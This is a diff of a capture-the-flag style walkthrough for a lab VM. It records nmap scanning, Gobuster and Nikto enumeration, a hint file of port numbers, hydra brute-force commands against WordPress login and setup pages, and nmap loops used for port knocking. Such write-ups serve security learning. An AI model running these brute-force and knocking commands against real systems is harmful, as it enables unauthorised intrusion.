@@ -107,40 +107,117 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
 ```
 
-31337 - Elite
+From the Nmap results we are able to see 3 ports that have been filtered by a firewall:
+4655, 7654, 31337
 
+## Gobuster and Nikto 
+
+Vanquish ran gobuster using the Dirb Common.txt and Dirb Big.txt directory lists.
+
+*Nikto:*
+```
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ OSVDB-3092: /secret/: This might be interesting...
+```
+
+*Gobuster:*
+```
+Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.126.131:80/
+[+] Threads      : 5
+[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
+[+] Status codes : 200,204,500
+[+] Auth User    : username
+[+] Follow Redir : true
+[+] Expanded     : true
+=====================================================
+http://192.168.126.131:80/secret (Status: 200)
+http://192.168.126.131:80/wordpress (Status: 200)
+http://192.168.126.131:80/wp-content (Status: 200)
+http://192.168.126.131:80/wp-includes (Status: 200)
+http://192.168.126.131:80/wp-admin (Status: 200)
+=====================================================
+```
+
+Looks like we have a wordpress admin access area and what appears to be an entirely separate wordpress instance that has not yet been fully configured in the /wordpress path.
+The wordpress path is allowing me to setup a new instance of a wordpress site, but only if I am able to provide Database Credentials.
+
+## Tell me a secret
+
+The most interesting finding was the secret folder path that allowed the viewing of a file called bambam.txt.
+http://192.168.126.131/secret/bambam.txt
+```
+8890
+7000
+666
+
+pinkydb
+```
+
+With the wordpress username and secret content in hand, I converted the numbers into thier Ascii character equivalents and added them to the password list already created by vanquish (using CEWL and other sources).
+
+I attempted to brute force my way into the Wordpress login page that I found and the wp setup page I had found.
 
 ```
 hydra -l pinky1337 -P passwordlist.txt 192.168.126.131 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
-```
-
-```
-
-POST /wordpress/wp-admin/setup-config.php?step=2 HTTP/1.1
-
-Host: 192.168.126.131
-
-User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
-
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-
-Accept-Language: en-US,en;q=0.5
-
-Referer: http://192.168.126.131/wordpress/wp-admin/setup-config.php?step=1
-
-Connection: close
-
-Content-Type: application/x-www-form-urlencoded
-
-Content-Length: 86
-
-
-
-dbname=database&uname=root&pwd=root&dbhost=localhost&prefix=wp_&language=&submit=Submit
 ```
 
 
 ```
 hydra -L users.txt -P passwordlist.txt 192.168.126.131 -V http-form-post '/wordpress/wp-admin/setup-config.php?step=2:dbname=database&uname=^USER^&pwd=^PASS^&dbhost=localhost&prefix=wp_&language=&submit=Submit:Error establishing a database connection'
 ```
+
+The brute force apporach failed to yield any results.
+
+## Knock Knock Knock...
+
+After revisting bambam.txt again, I realized that these numbers are likely part of a port knock sequence to allow certian ports that are currently blocked to open up.  "Bam Bam" is of course the sound that someone makes when knocking on a door.
+
+Port Knocking with Nmap
+```
+for x in 8890 7000 666; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.225.130 && sleep 1; done
+```
+
+Check results:
+```
+root@kali:~# nmap -sS -p80,4655,7654,31337 192.168.225.130
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 17:48 PST
+Nmap scan report for 192.168.225.130
+Host is up (0.00052s latency).
+
+PORT      STATE    SERVICE
+80/tcp    open     http
+4655/tcp  filtered unknown
+7654/tcp  filtered unknown
+31337/tcp filtered Elite
+MAC Address: 00:0C:29:11:5C:81 (VMware)
+```
+
+Hmmm still filtered.
+I then proceeded to try running the numbers multiple times and in different combinations until this combination finally resulted in open ports:
+
+```
+for x in 7000 666 8890; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.225.130 && sleep 1; done
+```
+
+```
+root@kali:~# nmap -sS -p80,4655,7654,31337 192.168.225.130
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 18:02 PST
+Nmap scan report for 192.168.225.130
+Host is up (0.00052s latency).
+
+PORT      STATE SERVICE
+80/tcp    open  http
+4655/tcp  open  unknown
+7654/tcp  open  unknown
+31337/tcp open  Elite
+MAC Address: 00:0C:29:11:5C:81 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
+```
+
+
 
